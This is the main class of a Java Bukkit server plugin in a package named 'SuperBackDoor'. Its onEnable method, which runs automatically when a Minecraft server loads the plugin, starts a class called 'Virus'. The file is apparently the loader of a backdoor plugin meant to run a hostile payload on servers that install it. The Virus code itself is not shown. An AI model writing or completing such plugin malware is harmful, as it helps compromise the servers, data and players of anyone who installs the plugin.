package space.commandf1.SuperBackDoor;

import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

@SuppressWarnings("all")
public class Main extends JavaPlugin {
    @Override
    public void onEnable()
    {
        new Virus((Plugin) this);
    }
}
